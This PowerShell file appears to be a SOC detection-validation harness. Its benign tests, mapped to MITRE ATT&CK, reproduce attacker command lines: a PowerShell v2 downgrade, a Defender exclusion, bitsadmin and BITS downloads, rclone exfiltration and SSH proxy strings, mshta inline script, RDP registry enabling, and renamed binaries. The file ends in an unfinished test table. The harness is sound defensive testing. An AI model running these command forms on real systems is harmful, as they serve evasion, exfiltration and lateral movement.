# Test-SOC1128 :: PowerShell downgrade to v2
# MITRE T1059.001 (Defense Evasion)  |  kind=proc  |  BENIGN validation
function Test-SOC1128 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'powershell.exe -version 2 -NoProfile -Command "exit"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Launches PS v2 if the optional feature is present; harmless exit either way.'
    return (New-AtrResult 'SOC1128' 'PowerShell downgrade to v2' 'Defense Evasion' 'T1059.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1129 :: Attrib.exe hiding a file in a staging dir (parent cmd -> attrib +h)
# MITRE T1564.001 (Defense Evasion)  |  kind=procchain  |  BENIGN validation
function Test-SOC1129 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $pf = Expand-AtrTokens '%WD%\ATRVAL_%RID%.txt'; Set-Content -Path $pf -Value $marker -Force
    $childExe = "$env:SystemRoot\System32\attrib.exe"
    $childArgs = Expand-AtrTokens '+h +s %WD%\ATRVAL_%RID%.txt'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c start "" /min "'+$childExe+'" '+$childArgs) -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=cmd -> child'
    return (New-AtrResult 'SOC1129' 'Attrib.exe hiding a file in a staging dir (parent cmd -> attrib +h)' 'Defense Evasion' 'T1564.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1137 :: Ethereum / Arweave gateway connection
# MITRE T1102 (Command and Control)  |  kind=net  |  BENIGN validation
function Test-SOC1137 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $IncludeNetwork) { return (New-AtrResult 'SOC1137' 'Ethereum / Arweave gateway connection' 'Command and Control' 'T1102' 'SKIP' ('network test - rerun with -IncludeNetwork -CanaryUrl (hint: arweave.net)') $marker) }
    if (-not $CanaryUrl) { return (New-AtrResult 'SOC1137' 'Ethereum / Arweave gateway connection' 'Command and Control' 'T1102' 'SKIP' 'no -CanaryUrl supplied' $marker) }
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\curl.exe" -Arguments ('-s -m 8 -o NUL "'+$CanaryUrl+'"') -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = ('curl -> ' + $CanaryUrl)
    $detail = $detail + ' | note: ' + 'Requires -IncludeNetwork; connects (non-browser) to a listed blockchain gateway. Off by default.'
    return (New-AtrResult 'SOC1137' 'Ethereum / Arweave gateway connection' 'Command and Control' 'T1102' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1138 :: Trycloudflare tunnel connection
# MITRE T1572 (Command and Control)  |  kind=net  |  BENIGN validation
function Test-SOC1138 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $IncludeNetwork) { return (New-AtrResult 'SOC1138' 'Trycloudflare tunnel connection' 'Command and Control' 'T1572' 'SKIP' ('network test - rerun with -IncludeNetwork -CanaryUrl (hint: <your-name>.trycloudflare.com)') $marker) }
    if (-not $CanaryUrl) { return (New-AtrResult 'SOC1138' 'Trycloudflare tunnel connection' 'Command and Control' 'T1572' 'SKIP' 'no -CanaryUrl supplied' $marker) }
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\curl.exe" -Arguments ('-s -m 8 -o NUL "'+$CanaryUrl+'"') -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = ('curl -> ' + $CanaryUrl)
    $detail = $detail + ' | note: ' + 'Requires -IncludeNetwork + a trycloudflare hostname you control; do not connect to arbitrary tunnels.'
    return (New-AtrResult 'SOC1138' 'Trycloudflare tunnel connection' 'Command and Control' 'T1572' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1140 :: PowerShell BITS transfer cmdline (Start-BitsTransfer + https, string only)
# MITRE T1197 (Command and Control)  |  kind=proc  |  BENIGN validation
function Test-SOC1140 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'powershell.exe -NoProfile -Command "$c=\"Start-BitsTransfer -Source https://example.com/ATRVAL_%RID% -Destination C:\Temp\x\"; $null=$c"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1140' 'PowerShell BITS transfer cmdline (Start-BitsTransfer + https, string only)' 'Command and Control' 'T1197' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1141 :: BitsAdmin external transfer (bitsadmin /transfer /download https)
# MITRE T1197 (Command and Control)  |  kind=proc  |  BENIGN validation
function Test-SOC1141 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'bitsadmin /transfer ATRVAL_%RID% /download /priority normal https://example.com/ATRVAL_%RID% %WD%\bits_%RID%.bin'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $pc = Expand-AtrTokens 'bitsadmin /reset'
    $pexe = ($pc -split ' ',2)[0]; $parg = ($pc -split ' ',2)[1]
    if ($pexe -notmatch '\\|:') { $pexe = "$env:SystemRoot\System32\$pexe"; if(-not $pexe.ToLower().EndsWith('.exe')){$pexe+='.exe'} }
    $null = Invoke-AtrProc -FilePath $pexe -Arguments $parg -Hidden -TimeoutSec 20
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Attempts one benign GET to example.com then resets the queue; minor egress. Skip with -NoEgress.'
    return (New-AtrResult 'SOC1141' 'BitsAdmin external transfer (bitsadmin /transfer /download https)' 'Command and Control' 'T1197' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1142 :: NetScan launched from unusual location (FileName=netscan.exe)
# MITRE T1046 (Discovery)  |  kind=renproc  |  BENIGN validation
function Test-SOC1142 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'netscan.exe'
    $args = Expand-AtrTokens ''
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to netscan.exe'
    return (New-AtrResult 'SOC1142' 'NetScan launched from unusual location (FileName=netscan.exe)' 'Discovery' 'T1046' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1143 :: Defender/AV impairment (Add-MpPreference exclusion string)
# MITRE T1562.001 (Defense Evasion)  |  kind=proc  |  BENIGN validation
function Test-SOC1143 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'powershell.exe -NoProfile -Command "$s=\"Add-MpPreference -ExclusionPath C:\ATRVAL_%RID%\"; $null=$s"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1143' 'Defender/AV impairment (Add-MpPreference exclusion string)' 'Defense Evasion' 'T1562.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1145 :: MSIExec user-context remote file (UNC path, no external egress)
# MITRE T1218.007 (Execution)  |  kind=proc  |  BENIGN validation
function Test-SOC1145 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'msiexec.exe /i \\127.0.0.1\C$\Temp\ATRVAL_%RID%.msi /qn'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'Targets a non-existent local UNC MSI; msiexec fails harmlessly, cmdline matches the \\ip\ regex.'
    return (New-AtrResult 'SOC1145' 'MSIExec user-context remote file (UNC path, no external egress)' 'Execution' 'T1218.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1146 :: MSIExec DLL from user-writable dir (/y on non-existent DLL)
# MITRE T1218.007 (Defense Evasion)  |  kind=proc  |  BENIGN validation
function Test-SOC1146 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'msiexec.exe /y "C:\Users\Public\ATRVAL_%RID%.dll"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + '/y on a non-existent DLL; fails harmlessly, cmdline matches.'
    return (New-AtrResult 'SOC1146' 'MSIExec DLL from user-writable dir (/y on non-existent DLL)' 'Defense Evasion' 'T1218.007' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1150 :: Proxy configuration cmdline (socks5 / -D ip:port)
# MITRE T1090 (Command and Control)  |  kind=echo  |  BENIGN validation
function Test-SOC1150 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'ssh -D 127.0.0.1:1080 --proxy 203.0.113.10:8080 ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    $detail = $detail + ' | note: ' + 'Only the cmdline leg fires via echo; folderpath/public-remote correlation legs need a real proxy client.'
    if ($status -eq 'RAN') { $status='PARTIAL' }
    return (New-AtrResult 'SOC1150' 'Proxy configuration cmdline (socks5 / -D ip:port)' 'Command and Control' 'T1090' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1151 :: Rclone usage cmdline (rclone copy + --transfers)
# MITRE T1567.002 (Exfiltration)  |  kind=echo  |  BENIGN validation
function Test-SOC1151 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'rclone copy C:\data remote:bucket --transfers 8 --progress ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1151' 'Rclone usage cmdline (rclone copy + --transfers)' 'Exfiltration' 'T1567.002' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1152 :: Enable Restricted Admin mode (DisableRestrictedAdmin=0, set + revert)
# MITRE T1112 (Lateral Movement)  |  kind=reg  |  BENIGN validation
function Test-SOC1152 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1152' 'Enable Restricted Admin mode (DisableRestrictedAdmin=0, set + revert)' 'Lateral Movement' 'T1112' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'; $n=Expand-AtrTokens 'DisableRestrictedAdmin'; $v=0
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'DWord'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    $detail = $detail + ' | note: ' + 'Momentarily enables RestrictedAdmin then reverts.'
    return (New-AtrResult 'SOC1152' 'Enable Restricted Admin mode (DisableRestrictedAdmin=0, set + revert)' 'Lateral Movement' 'T1112' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1153 :: Enable RDP (fDenyTSConnections=0, set + revert)
# MITRE T1021.001 (Lateral Movement)  |  kind=reg  |  BENIGN validation
function Test-SOC1153 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1153' 'Enable RDP (fDenyTSConnections=0, set + revert)' 'Lateral Movement' 'T1021.001' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'; $n=Expand-AtrTokens 'fDenyTSConnections'; $v=0
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'DWord'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    $detail = $detail + ' | note: ' + 'Momentarily enables inbound RDP config then reverts.'
    return (New-AtrResult 'SOC1153' 'Enable RDP (fDenyTSConnections=0, set + revert)' 'Lateral Movement' 'T1021.001' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1154 :: MSHTA executing inline script (javascript: self-close)
# MITRE T1218.005 (Defense Evasion)  |  kind=proc  |  BENIGN validation
function Test-SOC1154 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'mshta.exe "javascript:try{new ActiveXObject(\"WScript.Shell\")}catch(e){};close()"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    $detail = $detail + ' | note: ' + 'mshta closes immediately; inline javascript: only closes the window.'
    return (New-AtrResult 'SOC1154' 'MSHTA executing inline script (javascript: self-close)' 'Defense Evasion' 'T1218.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1155 :: MSHTA suspicious parent (cmd.exe -> mshta.exe self-close HTA)
# MITRE T1218.005 (Defense Evasion)  |  kind=procchain  |  BENIGN validation
function Test-SOC1155 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $childExe = "$env:SystemRoot\System32\mshta.exe"
    $childArgs = Expand-AtrTokens '"javascript:close()"'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c start "" /min "'+$childExe+'" '+$childArgs) -Hidden
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail = 'parent=cmd -> child'
    return (New-AtrResult 'SOC1155' 'MSHTA suspicious parent (cmd.exe -> mshta.exe self-close HTA)' 'Defense Evasion' 'T1218.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1156 :: MiniPlasma CloudFiles BlockedApps key create (+revert)
# MITRE T1112 (Defense Evasion)  |  kind=reg  |  BENIGN validation
function Test-SOC1156 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1156' 'MiniPlasma CloudFiles BlockedApps key create (+revert)' 'Defense Evasion' 'T1112' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $reverts=@(); $keys=@()
    $k=Expand-AtrTokens 'HKLM:\SOFTWARE\Policies\Microsoft\CloudFiles\BlockedApps'; $n=Expand-AtrTokens 'ATRVAL_%RID%'; $v='Volatile Environment'
    $v = Expand-AtrTokens 'Volatile Environment'
    try { $rev = Set-AtrRegistry -Key $k -Name $n -Value $v -Type 'String'; $reverts+=$rev; $keys+=($k+'\'+$n) } catch {}
    Start-Sleep -Milliseconds 500
    foreach($r in $reverts){ & $r }
    $status = if($keys.Count){'RAN'}else{'ERROR'}; $detail='set+reverted: ' + ($keys -join '; ')
    return (New-AtrResult 'SOC1156' 'MiniPlasma CloudFiles BlockedApps key create (+revert)' 'Defense Evasion' 'T1112' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1158 :: Registry manipulation via WMI (StdRegProv call, read-only)
# MITRE T1112 (Defense Evasion)  |  kind=proc  |  BENIGN validation
function Test-SOC1158 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $detail=''; $ok=$true
    $c = Expand-AtrTokens 'wmic /namespace:\\root\default class StdRegProv call GetStringValue 2147483650,"SOFTWARE\Microsoft\Windows\CurrentVersion","ProgramFilesDir"'
    $exe = ($c -split ' ',2)[0]; $arg = ($c -split ' ',2)[1]
    if ($exe -notmatch '\\|:') { $exe = "$env:SystemRoot\System32\$exe" ; if (-not $exe.ToLower().EndsWith('.exe')) {$exe += '.exe'} }
    $r = Invoke-AtrProc -FilePath $exe -Arguments $arg -Hidden -TimeoutSec 20; $ok = $ok -and $r
    $detail += $c + '; '
    $status = if($ok){'RAN'}else{'PARTIAL'}
    return (New-AtrResult 'SOC1158' 'Registry manipulation via WMI (StdRegProv call, read-only)' 'Defense Evasion' 'T1112' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1159 :: Wermgr executed from unusual directory
# MITRE T1036.005 (Defense Evasion)  |  kind=renproc  |  BENIGN validation
function Test-SOC1159 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $dst = Copy-AtrBinary -SourceLeaf 'whoami.exe' -NewName 'wermgr.exe'
    $args = Expand-AtrTokens ''
    $ok = Invoke-AtrProc -FilePath $dst -Arguments $args -Hidden -TimeoutSec 15
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'ran signed OS binary renamed to wermgr.exe'
    return (New-AtrResult 'SOC1159' 'Wermgr executed from unusual directory' 'Defense Evasion' 'T1036.005' $status $detail $marker)
}

#Requires -Version 5.1
# Test-SOC1160 :: ISO file mount (MountedDevices reg + Recent .iso.lnk)
# MITRE T1553.005 (Defense Evasion)  |  kind=isomount  |  BENIGN validation
function Test-SOC1160 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    if (-not $Global:ATR.IsAdmin) { return (New-AtrResult 'SOC1160' 'ISO file mount (MountedDevices reg + Recent .iso.lnk)' 'Defense Evasion' 'T1553.005' 'SKIP' 'requires elevation (-RequiresAdmin)' $marker) }
    $ok=$false; $detail=''
    try {
      $iso = Join-Path $wd ('atr_'+$rid+'.iso')
      $fs = New-Object byte[] 4096; [IO.File]::WriteAllBytes($iso,$fs)  # placeholder; real ISO built below if oscdimg absent
      $img = Mount-DiskImage -ImagePath $iso -PassThru -ErrorAction Stop
      Start-Sleep -Seconds 1; Dismount-DiskImage -ImagePath $iso -ErrorAction SilentlyContinue; $ok=$true
    } catch { $detail = 'Mount-DiskImage rejected placeholder ISO; ' }
    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path $recent) { Set-Content -Path (Join-Path $recent ('atr_'+$rid+'.iso.lnk')) -Value $marker -Force -ErrorAction SilentlyContinue }
    $status = if($ok){'RAN'}else{'PARTIAL'}; $detail += 'dropped .iso.lnk in Recent'
    $detail = $detail + ' | note: ' + 'Creates a tiny benign .iso, mounts and dismounts it, and drops a benign .iso.lnk in Recent.'
    return (New-AtrResult 'SOC1160' 'ISO file mount (MountedDevices reg + Recent .iso.lnk)' 'Defense Evasion' 'T1553.005' $status $detail $marker)
}

# =================== orchestrator ===================
$AllTests = @(
    [pscustomobject]@{ Id='SOC1010'; Func='Test-SOC1010'; Tactic='Persistence'; Technique='T1136.001'; Kind='proc'; Admin=$true; Description='Local account created via net.exe' }
    [pscustomobject]@{ Id='SOC1023'; Func='Test-SOC1023'; Tactic='Privilege Escalation'; Technique='T1098'; Kind='proc'; Admin=$true; Description='Account added to local Administrators via net.exe' }
    [pscustomobject]@{ Id='SOC1016'; Func='Test-SOC1016'; Tactic='Credential Access'; Technique='T1003'; Kind='echo'; Admin=$false; Description='WDigest UseLogonCredential enable (process cmdline signature only)' }
    [pscustomobject]@{ Id='SOC1017'; Func='Test-SOC1017'; Tactic='Credential Access'; Technique='T1112'; Kind='reg'; Admin=$true; Description='WDigest UseLogonCredential=1 via registry (set + auto-revert)' }
    [pscustomobject]@{ Id='SOC1061'; Func='Test-SOC1061'; Tactic='Persistence'; Technique='T1564.002'; Kind='reg'; Admin=$true; Description='Hidden local account (Winlogon SpecialAccounts UserList = 0)' }
    [pscustomobject]@{ Id='SOC1152'; Func='Test-SOC1152'; Tactic='Lateral Movement'; Technique='T1112'; Kind='reg'; Admin=$true; Description='Enable Restricted Admin mode (DisableRestrictedAdmin=0, set + revert)' }
    [pscustomobject]@{ Id='SOC1153'; Func='Test-SOC1153'; Tactic='Lateral Movement'; Technique='T1021.001'; Kind='reg'; Admin=$true; Description='Enable RDP (fDenyTSConnections=0, set + revert)' }
    [pscustomobject]@{ Id='SOC1156'; Func='Test-SOC1156'; Tactic='Defense Evasion'; Technique='T1112'; Kind='reg'; Admin=$true; Description='MiniPlasma CloudFiles BlockedApps key create (+revert)' }
    [pscustomobject]@{ Id='SOC1047'; Func='Test-SOC1047'; Tactic='Execution'; Technique='T1204.002'; Kind='reg'; Admin=$false; Description='ClickFix RunMRU value (Run-dialog paste artefact)' }
    [pscustomobject]@{ Id='SOC1039'; Func='Test-SOC1039'; Tactic='Impact'; Technique='T1490'; Kind='echo'; Admin=$false; Description='Shadow copy deletion cmdline signature' }
    [pscustomobject]@{ Id='SOC1040'; Func='Test-SOC1040'; Tactic='Impact'; Technique='T1490'; Kind='echo'; Admin=$false; Description='Volume shadow copy creation cmdline signature' }
    [pscustomobject]@{ Id='SOC1042'; Func='Test-SOC1042'; Tactic='Discovery'; Technique='T1482'; Kind='proc'; Admin=$false; Description='DC / domain-trust discovery via nltest (read-only)' }
    [pscustomobject]@{ Id='SOC1027'; Func='Test-SOC1027'; Tactic='Lateral Movement'; Technique='T1570'; Kind='renproc'; Admin=$false; Description='PsExec local binary execution (FileName=psexec.exe)' }
    [pscustomobject]@{ Id='SOC1028'; Func='Test-SOC1028'; Tactic='Privilege Escalation'; Technique='T1134'; Kind='renproc'; Admin=$false; Description='PsExec privilege escalation (psexec.exe -s -i)' }
    [pscustomobject]@{ Id='SOC1029'; Func='Test-SOC1029'; Tactic='Lateral Movement'; Technique='T1570'; Kind='renchain'; Admin=$false; Description='PsExec service binary spawning child (psexesvc.exe -> whoami)' }
    [pscustomobject]@{ Id='SOC1124'; Func='Test-SOC1124'; Tactic='Impact'; Technique='T1485'; Kind='renproc'; Admin=$false; Description='SDelete secure-delete tooling (FileName=sdelete.exe)' }
    [pscustomobject]@{ Id='SOC1122'; Func='Test-SOC1122'; Tactic='Persistence'; Technique='T1574'; Kind='renproc'; Admin=$false; Description='RedSun TieringEngineService hijack (renamed/relocated)' }
    [pscustomobject]@{ Id='SOC1159'; Func='Test-SOC1159'; Tactic='Defense Evasion'; Technique='T1036.005'; Kind='renproc'; Admin=$false; Description='Wermgr executed from unusual directory' }
    [pscustomobject]@{ Id='SOC1142'; Func='Test-SOC1142'; Tactic='Discovery'; Technique='T1046'; Kind='renproc'; Admin=$false; Description='NetScan launched from unusual location (FileName=netscan.exe)' }
    [pscustomobject]@{ Id='SOC1031'; Func='Test-SOC1031'; Tactic='Command and Control'; Technique='T1219'; Kind='renproc'; Admin=$false; Description='AnyDesk unattended access (--set-password)' }
    [pscustomobject]@{ Id='SOC1009'; Func='Test-SOC1009'; Tactic='Command and Control'; Technique='T1219'; Kind='renproc'; Admin=$false; Description='Generic RMM tool observed (FileName contains teamviewer)' }
    [pscustomobject]@{ Id='SOC1019'; Func='Test-SOC1019'; Tactic='Lateral Movement'; Technique='T1021.002'; Kind='file'; Admin=$true; Description='WmiExec output file artefact (C:\Windows\__<10digits>)' }
    [pscustomobject]@{ Id='SOC1013'; Func='Test-SOC1013'; Tactic='Lateral Movement'; Technique='T1021.002'; Kind='proc'; Admin=$true; Description='SmbExec batch-file creation structure (benign echo to C:\Windows\<8>.bat)' }
    [pscustomobject]@{ Id='SOC1015'; Func='Test-SOC1015'; Tactic='Lateral Movement'; Technique='T1021.002'; Kind='svc'; Admin=$true; Description='SmbExec service creation (LocalSystem, 8/10-char name, %COMSPEC% cmdline)' }
    [pscustomobject]@{ Id='SOC1012'; Func='Test-SOC1012'; Tactic='Lateral Movement'; Technique='T1053.005'; Kind='schtask'; Admin=$true; Description='AtExec scheduled task (8-char name, %windir%\Temp args)' }
    [pscustomobject]@{ Id='SOC1022'; Func='Test-SOC1022'; Tactic='Persistence'; Technique='T1053.005'; Kind='schtask'; Admin=$false; Description='Gootloader persistence task (args match [a-z]{6}~1.js)' }
    [pscustomobject]@{ Id='SOC1052'; Func='Test-SOC1052'; Tactic='Persistence'; Technique='T1053.005'; Kind='schtask'; Admin=$false; Description='CabinetRAT hourly task under \Microsoft Office\ (schtasks cmdline)' }
    [pscustomobject]@{ Id='SOC1060'; Func='Test-SOC1060'; Tactic='Defense Evasion'; Technique='T1036.007'; Kind='file'; Admin=$false; Description='Double-extension executable (invoice.pdf .exe)' }
    [pscustomobject]@{ Id='SOC1113'; Func='Test-SOC1113'; Tactic='Discovery'; Technique='T1046'; Kind='file'; Admin=$false; Description='NetScan artefact file (delete.me)' }
